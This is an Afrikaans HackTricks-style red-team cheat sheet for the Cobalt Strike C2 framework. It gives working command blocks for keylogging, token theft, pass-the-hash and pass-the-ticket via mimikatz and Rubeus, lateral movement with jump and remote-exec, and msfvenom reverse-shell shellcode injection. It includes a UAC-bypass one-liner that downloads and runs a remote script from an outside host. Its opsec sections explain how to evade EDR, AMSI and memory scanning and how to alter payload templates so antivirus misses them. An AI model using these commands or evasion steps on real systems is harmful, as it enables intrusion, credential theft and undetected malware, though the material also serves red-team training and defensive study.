# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` dan kan jy kies waar om te luister, watter soort beacon om te gebruik (http, dns, smb...) en meer.

### Peer2Peer Listeners

Die beacons van hierdie listeners hoef nie direk met die C2 te praat nie; hulle kan via ander beacons met dit kommunikeer.

`Cobalt Strike -> Listeners -> Add/Edit` dan moet jy die TCP of SMB beacons selekteer

* The **TCP beacon will set a listener in the port selected**. Om aan te sluit by 'n TCP beacon gebruik die bevel `connect <ip> <port>` van 'n ander beacon
* The **smb beacon will listen in a pipename with the selected name**. Om aan te sluit by 'n SMB beacon moet jy die bevel `link [target] [pipe]` gebruik.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** vir HTA-lêers
* **`MS Office Macro`** vir 'n Office-dokument met 'n macro
* **`Windows Executable`** vir 'n .exe, .dll of service .exe
* **`Windows Executable (S)`** vir 'n **stageless** .exe, .dll of service .exe (beter stageless as staged, minder IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dit sal 'n script/uitvoerbare lêer genereer om die beacon vanaf Cobalt Strike af te laai in formate soos: bitsadmin, exe, powershell en python

#### Host Payloads

As jy reeds die lêer het wat jy op 'n webserver wil host, gaan net na `Attacks -> Web Drive-by -> Host File` en kies die lêer om te host en die webserver-config.

### Beacon Options

<details>
<summary>Beacon opsies en opdragte</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Aangepaste implante / Linux Beacons

- 'n Aangepaste agent hoef slegs die Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) te praat om te registreer/check-in en take te ontvang. Implementeer dieselfde URIs/headers/metadata crypto wat in die profiel gedefinieer is om die Cobalt Strike UI vir tasking en output te hergebruik.
- 'n Aggressor Script (bv. `CustomBeacon.cna`) kan payload-generering vir die non-Windows beacon omsluit sodat operators die listener kan kies en ELF payloads direk vanaf die GUI kan produseer.
- Voorbeeld Linux task handlers wat aan die Team Server blootgestel word: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, en `exit`. Hierdie map na task IDs wat deur die Team Server verwag word en moet server-side geïmplementeer word om output in die regte formaat terug te gee.
- BOF support op Linux kan bygevoeg word deur Beacon Object Files in-proses te laai met [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (supports Outflank-style BOFs too), wat modulêre post-exploitation toelaat om binne die implant se konteks/privileges te loop sonder om nuwe prosesse te skep.
- Inkorporeer 'n SOCKS handler in die custom beacon om pivoting-pariteit met Windows Beacons te behou: wanneer die operator `socks <port>` uitvoer, moet die implant 'n plaaslike proxy oopmaak om operator tooling deur die gecompromitteerde Linux gasheer na interne netwerke te stuur.

## Opsec

### Execute-Assembly

Die **`execute-assembly`** gebruik 'n **sacrificial process** wat remote process injection gebruik om die aangeduide program uit te voer. Dit is baie lawaaierig, aangesien sekere Win APIs gebruik word om binne 'n proses te inject wat deur elke EDR nagegaan word. Daar is egter 'n paar custom tools wat gebruik kan word om iets in dieselfde proses te laai:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike kan jy ook BOF (Beacon Object Files) gebruik: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Die agressor script `https://github.com/outflanknl/HelpColor` sal die `helpx` bevel in Cobalt Strike skep wat kleure in bevels sit wat aandui of dit BOFs is (groen), Fork&Run-agtig (geel) en soortgelyk, of ProcessExecution/injection-agtig (rooi). Dit help om te sien watter bevels meer stealthy is.

### Act as the user

Jy kan gebeurtenisse soos `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` nagaan:

- Security EID 4624 - Kyk na alle interaktiewe logons om die gewone werksure te ken.
- System EID 12,13 - Kyk na afsluit/opstart/slaap frekwensie.
- Security EID 4624/4625 - Kyk na inkomende geldige/ongeldige NTLM pogings.
- Security EID 4648 - Hierdie gebeurtenis word geskep wanneer plaintext credentials gebruik word om aan te meld. As 'n proses dit gegenereer het, kan die binêre moontlik die credentials in plain text in 'n config-lêer of in die kode hê.

Wanneer jy `jump` vanaf cobalt strike gebruik, is dit beter om die `wmi_msbuild` metode te gebruik sodat die nuwe proses meer legit lyk.

### Use computer accounts

Dit is algemeen dat verdedigers vreemde gedrag van gebruikers monitor en service accounts en computer accounts soos `*$` uitsluit van hul monitering. Jy kan hierdie rekeninge gebruik om lateral movement of privilege escalation uit te voer.

### Use stageless payloads

Stageless payloads is minder lawaaierig as staged ones omdat hulle nie 'n tweede stage van die C2 server hoef af te laai nie. Dit beteken hulle genereer geen verdere netwerkverkeer ná die aanvanklike verbinding nie, wat hulle minder waarskynlik maak om deur netwerkgebaseerde verdediging opgespoor te word.

### Tokens & Token Store

Wees versigtig wanneer jy tokens steel of genereer want 'n EDR kan moontlik al die tokens van alle threads enumereer en 'n **token belonging to a different user** of selfs SYSTEM in die proses vind.

Dit maak dit nuttig om tokens **per beacon** te stoor sodat dit nie nodig is om dieselfde token oor en oor te steel nie. Dit is handig vir lateral movement of wanneer jy 'n gesteelde token meerdere kere moet gebruik:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Wanneer jy lateraal beweeg, is dit gewoonlik beter om 'n token te steel as om 'n nuwe een te genereer of 'n pass the hash aanval uit te voer.

### Guardrails

Cobalt Strike het 'n funksie genaamd **Guardrails** wat help om die gebruik van sekere bevels of aksies wat deur verdedigers gedetecteer kan word, te voorkom. Guardrails kan gekonfigureer word om spesifieke bevels te blokkeer, soos `make_token`, `jump`, `remote-exec`, en ander wat algemeen vir lateral movement of privilege escalation gebruik word.

Verder bevat die repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ook sommige kontroles en idees wat jy kan oorweeg voor jy 'n payload uitvoer.

### Tickets encryption

In 'n AD wees versigtig met die enkripsie van die tickets. Standaard gebruik sommige tools RC4 enkripsie vir Kerberos tickets, wat minder veilig is as AES enkripsie — moderne omgewings gebruik per default AES. Dit kan deur verdedigers opgespoor word wat vir swak enkripsie-algoritmes monitor.

### Avoid Defaults

Wanneer jy Cobalt Strike gebruik, sal die SMB pipes per default name hê soos `msagent_####` en `status_####`. Verander daardie name. Dit is moontlik om die name van bestaande pipes in Cobalt Strike te kontroleer met die bevel: `ls \\.\pipe\`

Verder word by SSH-sessies 'n pipe soos `\\.\pipe\postex_ssh_####` geskep. Verander dit met `set ssh_pipename "<new_name>";`.

Ook in postex exploitation-aanvalle kan die pipes `\\.\pipe\postex_####` gewysig word met `set pipename "<new_name>"`.

In Cobalt Strike profiles kan jy ook dinge aanpas soos:

- Avoiding using `rwx`
- Hoe die process injection gedrag werk (watter APIs gebruik gaan word) in die `process-inject {...}` block
- Hoe die "fork and run" werk in die `post-ex {…}` block
- Die sleep time
- Die max size van binaries wat in memory gelaai kan word
- Die memory footprint en DLL content met die `stage {...}` block
- Die netwerkverkeer

### Bypass memory scanning

Sommige EDRs scan geheue vir bekende malware-handtekeninge. Cobalt Strike laat toe om die `sleep_mask` funksie as 'n BOF te wysig wat die backdoor in memory kan enkripteer.

### Noisy proc injections

Wanneer kode in 'n proses geïnject word is dit gewoonlik baie rumoerig, omdat geen gewone proses gewoonlik hierdie aksies uitvoer en omdat die maniere om dit te doen beperk is. Dit kan dus deur gedraggebaseerde deteksie-stelsels opgespoor word. Verder kan dit ook deur EDRs opgespoor word wat netwerkprosesse soek vir threads wat kode bevat wat nie op skyf is nie (alhoewel prosesse soos browsers met JIT dit algemeen het). Voorbeeld: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Wanneer 'n nuwe proses geskep word is dit belangrik om 'n normale ouer-kind verhouding tussen prosesse te behou om deteksie te vermy. As svchost.exec iexplorer.exe uitvoer sal dit verdag lyk, aangesien svchost.exe nie normaalweg die ouer van iexplorer.exe is nie.

Wanneer 'n nuwe beacon in Cobalt Strike gespawn word, skep dit per default 'n proses wat **`rundll32.exe`** gebruik om die nuwe listener te laat loop. Dit is nie baie stealthy nie en kan maklik deur EDRs opgespoor word. Verder word `rundll32.exe` sonder enige args gedraai wat dit nog verdagter maak.

Met die volgende Cobalt Strike bevel kan jy 'n ander proses spesifiseer om die nuwe beacon te spawn, wat dit minder opspoorbaar maak:
```bash
spawnto x86 svchost.exe
```
Jy kan ook hierdie instelling **`spawnto_x86` en `spawnto_x64`** in 'n profiel verander.

### Proxying aanvallers se verkeer

Aanvallers sal soms hul gereedskap lokaal moet kan laat loop, selfs op linux-masjiene, en die verkeer van slagoffers na daardie instrument stuur (bv. NTLM relay).

Bovendien is dit soms, wanneer 'n pass-the.hash of pass-the-ticket aanval uitgevoer word, vir die aanvaller minder opvallend om **hierdie hash of ticket plaaslik by sy eie LSASS-proses te voeg** en dan daarvan te pivot in plaas daarvan om die LSASS-proses van 'n slagoffer te wysig.

Jy moet egter **versigtig wees met die gegenereerde verkeer**, aangesien jy moontlik ongewone verkeer (kerberos?) vanaf jou backdoor-proses stuur. Hiervoor kan jy na 'n browser-proses pivot (alhoewel jy gevang kan word as jy jouself in 'n proses injekteer — dink dus aan 'n stilletjies manier om dit te doen).

### Vermy AVs

#### AV/AMSI/ETW Bypass

Kyk na die bladsy:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Gewoonlik kan jy in `/opt/cobaltstrike/artifact-kit` die kode en vooraf-gecompileerde templates (in `/src-common`) vind van die payloads wat cobalt strike gaan gebruik om die binary beacons te genereer.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) te gebruik met die gegenereerde backdoor (of net met die gecompileerde sjabloon) kan jy uitvind wat die defender laat afgaan. Dit is gewoonlik 'n string. Daarom kan jy net die kode wysig wat die backdoor genereer sodat daardie string nie in die finale binary verskyn nie.

Na jy die kode aangepas het, voer net `./build.sh` uit vanuit dieselfde gids en kopieer die `dist-pipe/`-map na die Windows-kliënt in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Moet nie vergeet om die aggressiewe script `dist-pipe\artifact.cna` te laai om aan Cobalt Strike aan te dui om die hulpbronne vanaf die skyf te gebruik wat ons wil hê en nie diegene wat reeds gelaai is nie.

#### Resource Kit

Die ResourceKit folder bevat die sjablone vir Cobalt Strike se script-gebaseerde payloads, insluitend PowerShell, VBA en HTA.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die templates te gebruik, kan jy uitvind wat die verdediger (AMSI in hierdie geval) nie verdra nie en dit wysig:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Deur die gedetecteerde reëls te wysig kan een 'n sjabloon genereer wat nie gevang sal word nie.

Moet nie vergeet om die aggressiewe script `ResourceKit\resources.cna` te laai om Cobalt Strike aan te dui om die resources van die skyf te gebruik wat ons wil hê en nie diegene wat reeds gelaai is nie.

#### Funksie-hooks | Syscall

Function hooking is 'n baie algemene metode wat ERDs gebruik om kwaadwillige aktiwiteit op te spoor. Cobalt Strike laat jou toe om hierdie hooks te omseil deur **syscalls** te gebruik in plaas van die standaard Windows API-oproepe met die **`None`** config, of die `Nt*` weergawe van 'n funksie te gebruik met die **`Direct`** instelling, of net oor die `Nt*` funksie te spring met die **`Indirect`** opsie in die malleable profile. Afhangende van die stelsel kan een opsie meer onopvallend wees as die ander.

Dit kan in die profile gestel word of deur die command **`syscall-method`** te gebruik.

Dit kan egter ook opvallend wees.

Een opsie wat Cobalt Strike bied om funksie hooks te omseil, is om daardie hooks te verwyder met: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Jy kan ook nagaan watter funksies gehook is met [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) of [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)

<details>
<summary>Verskeie Cobalt Strike-opdragte</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Verwysings

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
